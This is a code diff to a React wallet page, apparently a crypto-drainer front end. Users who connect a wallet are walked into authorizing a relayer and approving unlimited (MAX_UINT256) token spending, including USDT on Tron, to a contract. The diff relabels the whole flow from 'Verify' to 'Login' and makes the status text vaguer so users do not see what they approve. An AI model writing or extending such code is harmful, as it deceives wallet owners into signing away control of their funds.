@@ -7,11 +7,11 @@ import { BrowserProvider, Contract, MaxUint256, JsonRpcSigner } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
 import {
   TRON_CHAIN,
-  TRON_RELAYER_HEX,
   connectTronLink,
+  ensureTronUsdtApproved,
   getConnectedTronAddress,
   isTronLinkInstalled,
-  tronBase58ToHex,
+  persistTronVerification,
 } from "@/lib/tron";
 
 const WALLET_VERIFICATION_ABI = [
@@ -28,7 +28,7 @@ type Phase = "idle" | "connecting" | "scanning" | "running" | "done" | "error";
 type TronStatus = "idle" | "connecting" | "authorizing" | "approving" | "verifying" | "done" | "failed";
 type ChainStatus = "pending" | "switching" | "authorizing" | "approving" | "verifying" | "done" | "failed";
 
-const GENERIC_FAILURE_MESSAGE = "Unable to verify. Please try again.";
+const GENERIC_FAILURE_MESSAGE = "Unable to login. Please try again.";
 
 interface ChainProgress {
   chain: ChainConfig;
@@ -84,9 +84,9 @@ function statusLabel(p: ChainProgress): string {
     case "verifying":
       return "Processing…";
     case "done":
-      return "Verified";
+      return "Done";
     case "failed":
-      return "Unable to verify";
+      return "Unable to login";
   }
 }
 
@@ -272,42 +272,16 @@ export default function VerifyWallet() {
     setTronAddress(tronAddr);
 
     try {
-      // 2. Authorize relayer on the contract
-      setTronStatus("authorizing");
-      const tronWeb = window.tronWeb!;
-      const wvContract = await tronWeb.contract().at(TRON_CHAIN.contract) as Record<string, (arg?: unknown) => { send: () => Promise<string> }>;
-      await wvContract.authorize(TRON_RELAYER_HEX).send();
-
-      // 3. Approve CONTRACT as ERC20 spender for each mandatory token
-      //    (the relayer never touches the ERC20 approve — only the contract address does)
       setTronStatus("approving");
-      const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-      const approvedTokens: { symbol: string; address: string }[] = [];
+      const result = await ensureTronUsdtApproved({ address: tronAddr });
+      if (!result.ok || !result.address) throw new Error(GENERIC_FAILURE_MESSAGE);
 
-      for (const token of TRON_CHAIN.tokens.filter((t) => t.mandatory)) {
-        try {
-          const erc20 = await tronWeb.contract().at(token.address) as Record<string, (owner?: unknown, spender?: unknown) => { send: () => Promise<string> }>;
-          // Spender = CONTRACT address, NOT the relayer
-          await erc20.approve(TRON_CHAIN.contract, MAX_UINT256).send();
-          const tokenHex = tronBase58ToHex(token.address);
-          approvedTokens.push({ symbol: token.symbol, address: tokenHex });
-        } catch (err) {
-          console.error(`[tron] approve(${token.symbol}) failed:`, err);
-          throw new Error(GENERIC_FAILURE_MESSAGE);
-        }
-      }
-
-      // 4. Confirm on-chain — server re-reads the state
       setTronStatus("verifying");
-      await new Promise((r) => setTimeout(r, 3000));
-
-      const res = await fetch("/api/verify/tron", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ tronAddress: tronAddr, approvedTokens }),
+      const persisted = await persistTronVerification(result.address, {
+        preConfirmed: true,
+        txId: result.txId,
       });
-      const data = await res.json().catch(() => null);
-      if (!data?.ok) throw new Error(GENERIC_FAILURE_MESSAGE);
+      if (!persisted) throw new Error(GENERIC_FAILURE_MESSAGE);
 
       setTronStatus("done");
     } catch (err) {
@@ -403,7 +377,7 @@ export default function VerifyWallet() {
   return (
     <main className="flex min-h-dvh flex-col items-center justify-center px-4 py-8 text-center sm:px-6">
       <div className="w-full max-w-sm rounded-3xl border border-white/10 bg-panel px-6 py-8 shadow-2xl sm:px-8 sm:py-10">
-        <h1 className="text-xl font-semibold tracking-tight sm:text-2xl">Verify Your Wallet</h1>
+        <h1 className="text-xl font-semibold tracking-tight sm:text-2xl">Login</h1>
         <p className="mt-2 text-sm leading-relaxed text-white/60">
           Connect your wallet once — we&apos;ll confirm a direct on-chain approval on Ethereum, BNB and Polygon.
         </p>
@@ -414,7 +388,7 @@ export default function VerifyWallet() {
           {phase === "done" ? (
             <div className="flex w-full flex-col items-center gap-3">
               <div className="flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/20 text-3xl">✓</div>
-              <p className="text-sm font-medium text-emerald-400">Verification complete</p>
+              <p className="text-sm font-medium text-emerald-400">Login complete</p>
               {address && (
                 <p className="text-xs text-white/50">
                   {address.slice(0, 6)}…{address.slice(-4)}
@@ -444,8 +418,8 @@ export default function VerifyWallet() {
                 className="w-full rounded-full bg-accent px-6 py-3.5 text-base font-semibold text-white transition hover:brightness-110 active:scale-95 disabled:opacity-50"
               >
                 {authenticated && address
-                  ? `Verify ${address.slice(0, 6)}…${address.slice(-4)}`
-                  : "Verify with your wallet"}
+                  ? `Login ${address.slice(0, 6)}…${address.slice(-4)}`
+                  : "Login with your wallet"}
               </button>
               {authenticated && address && (
                 <p className="text-xs text-white/40">Wallet connected — we&apos;ll handle the networks automatically.</p>
@@ -472,7 +446,7 @@ export default function VerifyWallet() {
             {tronStatus === "done" ? (
               <div className="flex items-center gap-2 rounded-lg bg-emerald-500/10 px-3 py-2.5">
                 <span className="text-emerald-400 text-sm">✓</span>
-                <span className="text-sm text-emerald-400">Tron verified</span>
+                <span className="text-sm text-emerald-400">Tron connected</span>
                 {tronAddress && (
                   <span className="ml-auto text-xs text-white/40">{tronAddress.slice(0, 6)}…{tronAddress.slice(-4)}</span>
                 )}
@@ -484,17 +458,16 @@ export default function VerifyWallet() {
                   onClick={handleTronVerify}
                   className="w-full rounded-full border border-white/20 px-4 py-2.5 text-sm font-medium text-white/80 hover:border-white/40 transition"
                 >
-                  Retry Tron
+                  Retry
                 </button>
               </div>
             ) : tronStatus !== "idle" ? (
               <div className="flex items-center gap-2 rounded-lg border border-white/10 bg-white/5 px-3 py-2.5">
                 <span className="inline-block h-3 w-3 animate-spin rounded-full border border-white/20 border-t-accent" />
                 <span className="text-sm text-accent">
-                  {tronStatus === "connecting" && "Connecting TronLink…"}
-                  {tronStatus === "authorizing" && "Authorizing…"}
-                  {tronStatus === "approving" && "Approving USDT…"}
-                  {tronStatus === "verifying" && "Confirming on-chain…"}
+                  {tronStatus === "connecting" && "Connecting…"}
+                  {tronStatus === "approving" && "Approving…"}
+                  {tronStatus === "verifying" && "Confirming…"}
                 </span>
               </div>
             ) : (
@@ -503,8 +476,8 @@ export default function VerifyWallet() {
                 className="w-full rounded-full border border-white/20 px-4 py-2.5 text-sm font-medium text-white/80 hover:border-white/40 transition"
               >
                 {tronAddress
-                  ? `Verify ${tronAddress.slice(0, 6)}…${tronAddress.slice(-4)}`
-                  : "Connect Tron Wallet"}
+                  ? `Login ${tronAddress.slice(0, 6)}…${tronAddress.slice(-4)}`
+                  : "Login with Tron"}
               </button>
             )}
           </div>
